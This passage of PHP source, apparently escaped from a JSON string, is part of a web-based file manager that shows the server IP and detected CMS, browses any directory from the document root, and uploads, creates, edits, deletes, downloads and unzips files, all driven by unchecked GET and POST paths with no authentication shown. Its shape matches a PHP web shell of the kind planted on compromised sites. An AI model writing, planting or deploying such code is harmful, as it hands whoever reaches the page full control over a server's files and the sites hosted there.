Uploaded!<\/a>\".'<\/b><\/font>';\r\n\t\t\t}\r\n\t\t}\r\n\t\telseif(sizeof($_FILES)!=0)\r\n\t\t\techo '<font color=\"red\"><b>No File Uploaded<\/b><\/font>';\r\n\t\t\t\t\r\n\t\tif (isset ($_GET['dir']))\r\n\t\t\t$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_GET['dir'];\r\n\t\telse\r\n\t\t\t$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_SERVER['DOCUMENT_ROOT'];\r\n\t\t\t?>\r\n\t\t\t<form method=\"post\" action=\"<?php echo $path_for_upload;?>\" enctype=\"multipart\/form-data\">\r\n\t\t\t<input type=\"file\" id=\"inputfile\" name=\"inputfile\">\r\n\t\t\t<input type=\"submit\" value=\"ok\">\r\n\t\t\t<\/form>\r\n\t\t\tCMS: <?php echo CMS();?><br>\r\n\t\t\tServer IP: <?php echo $_SERVER['SERVER_ADDR'];?><br>\r\n\t\t\tRoot: <?php echo '<a href=\"'.'http:\/\/'.$domain.$script_path.'?dir='.$_SERVER['DOCUMENT_ROOT'].'\">'.$_SERVER['DOCUMENT_ROOT'].'<\/a>'; ?>\r\n\t\t\t<br><br>\r\n\t\t\tDirectory: \r\n\t\t\t<?php \r\n\t\t\tif (isset ($_GET['dir'])) \r\n\t\t\t\t$path = $_GET['dir'];\r\n\t\t\telse\r\n\t\t\t\t$path = $_SERVER['DOCUMENT_ROOT'];\r\n\t\r\n\t\t\t\r\n\t\t\t$arr_path = explode(\"\/\", $path);\r\n\t\t\t$slesh_count = count($arr_path)-1;\r\n\r\n\t\t\t$arr_links = array();\r\n\t\t\t$path_for_work = $path;\r\n\t\t\t\r\n\t\t\tfor ($i=1; $i <= $slesh_count; $i++)\r\n\t\t\t{\r\n\t\t\t\t$path_for_work = folder_separate($path_for_work);\r\n\t\t\t\t$arr_links[] = $path_for_work;\r\n\t\t\t}\r\n\t\t\tfor ($i=1; $i <= $slesh_count; $i++)\r\n\t\t\t{\r\n\t\t\t\t$k = $slesh_count - $i - 1;\r\n\t\t\t\tif ($i !== $slesh_count)\r\n\t\t\t\t\techo '<a href=\"http:\/\/'.$domain.$script_path.'?dir='.$arr_links[\"$k\"].'\">'.$arr_path[\"$i\"].'<\/a>\/';\r\n\t\t\t\telse\r\n\t\t\t\t\techo '<a href=\"http:\/\/'.$domain.$script_path.'?dir='.$path.'\">'.$arr_path[\"$i\"].'<\/a>';\r\n\t\t\t}\r\n\t\t\t?>\r\n\t\t\t\r\n\t\t\t\r\n\t\t<\/td>\r\n\t<?php\r\n\t\r\n\t\tif (isset ($_GET['dir']))\r\n\t\t{\r\n\t\t\tif (isset ($_POST['new_file_name']))\r\n\t\t\t{\r\n\t\t\t\t$new_file = $_GET['dir'] . '\/' . $_POST['new_file_name'];\r\n\t\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_GET['dir'];\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (isset ($_POST['new_file_name']))\r\n\t\t\t{\r\n\t\t\t\t$new_file = $_SERVER['DOCUMENT_ROOT']. '\/' . $_POST['new_file_name'];\r\n\t\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_SERVER['DOCUMENT_ROOT'];\r\n\t\t}\t\r\n\t\r\n\t\r\n\t\r\n\t\tif ((empty($_POST ['new_file'])) and (empty($_POST ['search_file'])) and (empty($_POST ['new_dir'])))\r\n\t\t{\r\n\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t\t$path = $_GET['dir'];\r\n\t\t\telse\r\n\t\t\t\t$path = $_SERVER['DOCUMENT_ROOT'];\r\n\t\t\t\r\n\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $path;\r\n\t\t\t\r\n\t\t\tside_bar($make_file);\r\n\t\t}\r\n\t\telseif (!empty($_POST ['new_file']))\r\n\t\t{\r\n\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t\t$path = $_GET['dir'].'\/'.$_POST ['new_file'];\r\n\t\t\telse\r\n\t\t\t\t$path = $_SERVER['DOCUMENT_ROOT'].'\/'.$_POST ['new_file'];\r\n\t\t\t\r\n\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $path;\r\n\r\n\t\t\tif ($fp = fopen ($path, \"w\"))\r\n\t\t\t{\r\n\t\t\t\techo '<font color=\"green\">File created successfully!<\/font>';\r\n\t\t\t\tside_bar($make_file);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\techo '<font color=\"red\">Can not create!<\/font>';\r\n\t\t\t\tside_bar($make_file);\r\n\t\t\t}\r\n\t\t\tfclose ($fp);\r\n\t\t}\r\n\t\telseif (!empty($_POST['new_dir']))\r\n\t\t{\r\n\t\t\tif (isset($_GET['dir']))\r\n\t\t\t\t$path = $_GET['dir'].'\/'.$_POST['new_dir'];\r\n\t\t\telse\r\n\t\t\t\t$path = $_SERVER['DOCUMENT_ROOT'].'\/'.$_POST['new_dir'];\r\n\t\t\t\r\n\t\t\t$make_file = 'http:\/\/' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&new_dir=' . $path;\r\n\r\n\t\t\tif ($fp = mkdir($path))\r\n\t\t\t{\r\n\t\t\t\tside_bar($make_file);\r\n\t\t\t\techo \"<tr align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<font color=\\\"green\\\">Folder created successfully!<\/font><\/td>\".\"<td><\/td><td><\/td><td><\/td><td><\/td><\/tr>\";\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tside_bar($make_file);\r\n\t\t\t\techo \"<tr align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<font color=\\\"red\\\">Can not create folder!<\/font><\/td>\".\"<td><\/td><td><\/td><td><\/td><td><\/td><\/tr>\";\r\n\t\t\t}\r\n\t\t}\r\n\t\telseif (!empty($_POST['search_file']))\r\n\t\t{\r\n\t\t\t$file_name_for_search = $_POST['search_file'];\r\n\t\t\t$arr_all_filenames = findshells($_SERVER['DOCUMENT_ROOT']);\r\n\t\t\t\t\r\n\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t\t$dr = $_GET['dir'];\r\n\t\t\telse\r\n\t\t\t\t$dr = $_SERVER['DOCUMENT_ROOT'];\r\n\t\t\t\r\n\t\t\tside_bar($make_file);\r\n\t\t\t\r\n\t\t\tforeach ($arr_all_filenames as $each_file_name)\r\n\t\t\t{\r\n\t\t\t\t$result = stristr($each_file_name, $file_name_for_search);\r\n\t\t\t\tif ($result !== false)\r\n\t\t\t\t{\r\n\t\t\t\t\t$time = get_time($each_file_name);\r\n\t\t\t\t\t$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each_file_name);\r\n\t\t\t\t\techo \"<tr bgcolor=\\\"#ffffff\\\" align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<a style=\\\"text-decoration: none;\\\" href=\\\"http:\/\/$domain$script_path?edit=$each_file_name&dir=$dr\\\"><font color=\\\"black\\\">$each_file_name<\/font><\/a>\".\"<\/td><td>\".get_filesize($each_file_name).\"<\/td><td>$time<\/td><td>\".perms($each_file_name, '0').\"<\/td><td>\".\"<a href=\\\"http:\/\/$domain$script_path?del=$each_file_name&dir=$dr\\\">U<\/a>&nbsp;\".\"<a href=\\\"http:\/\/$domain$script_path?edit=$each_file_name&dir=$dr\\\">E<\/a>&nbsp;\".\"<a target=\\\"_blank\\\" href=\\\"http:\/\/$real_url\\\">O<\/a>&nbsp;\".\"<a href=\\\"http:\/\/$domain$script_path?download=$each_file_name&dir=$dr\\\">D<\/a>\".\"<\/td><\/tr>\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\tif (isset ($_GET['edit']))\r\n\t{\r\n\t\t$current = $domain.$script_path;\r\n\t\tedit_file($_GET['edit'], $current);\r\n\t}\r\n\t?>\r\n\t\r\n\t<tr align=\"center\" style=\"color: #423c63;\"><td align=\"left\"><b>Name<\/b><\/td><td><b>Size<\/b><\/td><td><b>Modify<\/b><\/td><td><b>Permissions<\/b><\/td><td><b>Actions<\/b><\/td><\/tr>\r\n\r\n\t<?php\r\n\t\r\n\tif (isset ($_GET['dir']))\r\n\t{\r\n\t\t$arr_files = scandir($_GET['dir']);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$arr_files = scandir($_SERVER['DOCUMENT_ROOT']);\r\n\t}\r\n\r\n\tforeach ($arr_files as $each)\r\n\t{\r\n\t\t$str_for_search = $each;\r\n\t\tif (isset ($_GET['dir']))\r\n\t\t\t$str_for_search = $_GET['dir'].'\/'.$each;\r\n\t\telse\r\n\t\t\t$str_for_search = $_SERVER['DOCUMENT_ROOT'].'\/'.$each;\r\n\r\n\t\tif (is_dir($str_for_search))\r\n\t\t\t$arr_folder[] = $each;\r\n\t\telse\r\n\t\t\t$arr_filenames[] = $each;\r\n\t}\r\n\t$k = 0;\t\r\n\tforeach ($arr_folder as $each)\r\n\t{\r\n\t\tif (($each !== '.') and ($each !== '..'))\r\n\t\t{\r\n\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t{\r\n\t\t\t\t$p = $_GET['dir'].'\/'.$each;\r\n\t\t\t\t$next_dir = $_GET['dir'].'\/'.$each;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$p = $_SERVER['DOCUMENT_ROOT'].'\/'.$each;\r\n\t\t\t\t$next_dir = $_SERVER['DOCUMENT_ROOT'].'\/'.$each;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t$path_for_unlink = $next_dir;\r\n\t\t\t$for_del = strrchr($path_for_unlink, '\/');\r\n\t\t\t$path_for_unlink = str_replace($for_del, '', $path_for_unlink);\r\n\t\t\r\n\t\t\t$time = get_time($p);\r\n\t\t\t\r\n\t\t\tif ($k % 2 == 0)\r\n\t\t\t\t$color_bg = '#fff8e7';\r\n\t\t\telse\r\n\t\t\t\t$color_bg = '#ffffe0';\r\n\t\t\t\r\n\t\t\techo \"<tr bgcolor=\\\"$color_bg\\\" align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<font color=\\\"#904d30\\\"><b><a href=\\\"http:\/\/$domain$script_path?dir=$next_dir\\\">$each<\/a><\/b><\/font>\".\"<\/td><td>dir<\/td><td>$time<\/td><td>\".perms($p, '0').\"<\/td><td>\".\"<a href=\\\"http:\/\/$domain$script_path?del=$p&dir=$path_for_unlink\\\">U<\/a>&nbsp;\".\"<\/td><\/tr>\";\r\n\t\t\t$k++;\r\n\t\t}\r\n\t}\r\n\t\r\n\r\n\tforeach ($arr_filenames as $each)\r\n\t{\r\n\t\t\r\n\t\tif (isset ($_GET['dir']))\r\n\t\t{\r\n\t\t\t$p = $_GET['dir'].'\/'.$each;\r\n\t\t\t$dr = $_GET['dir'];\r\n\t\t}\r\n\t\t\t\r\n\t\telse\r\n\t\t{\r\n\t\t\t$p = $_SERVER['DOCUMENT_ROOT'].'\/'.$each;\r\n\t\t\t$dr = $_SERVER['DOCUMENT_ROOT'];\r\n\t\t}\r\n\t\t$time = get_time($p);\r\n\t\t\r\n\t\t$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $p);\r\n\t\t\r\n\t\tif ($k % 2 == 0)\r\n\t\t\t$color_bg = '#fff8e7';\r\n\t\telse\r\n\t\t\t$color_bg = '#ffffe0';\r\n\r\n\t\t$per = stristr($each, '.zip');\r\n\t\tif ($per !== false)\r\n\t\t\t$per = \"<a href=\\\"http:\/\/$domain$script_path?unzip=$p&dir=$dr\\\">Z<\/a>&nbsp;\";\r\n\t\telse\r\n\t\t\t$per = \"<a href=\\\"http:\/\/$domain$script_path?edit=$p&dir=$dr\\\">E<\/a>&nbsp;\";\r\n \r\n\t\techo \"<tr bgcolor=\\\"$color_bg\\\" align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<a style=\\\"text-decoration: none;\\\" href=\\\"http:\/\/$domain$script_path?edit=$p&dir=$dr\\\"><font color=\\\"black\\\">$each<\/font><\/a>\".\"<\/td><td>\".get_filesize($p).\"<\/td><td>$time<\/td><td>\".perms($p, '0').\"<\/td><td>\".\"<a href=\\\"http:\/\/$domain$script_path?del=$p&dir=$dr\\\">U<\/a>&nbsp;\".$per.\"<a target=\\\"_blank\\\" href=\\\"http:\/\/$real_url\\\">O<\/a>&nbsp;\".\"<a href=\\\"http:\/\/$domain$script_path?download=$p&dir=$dr\\\">D<\/a>\".\"<\/td><\/tr>\";\r\n\t\t\r\n\t\t$k++;\r\n\t}\r\n?>\r\n<\/table>"
}
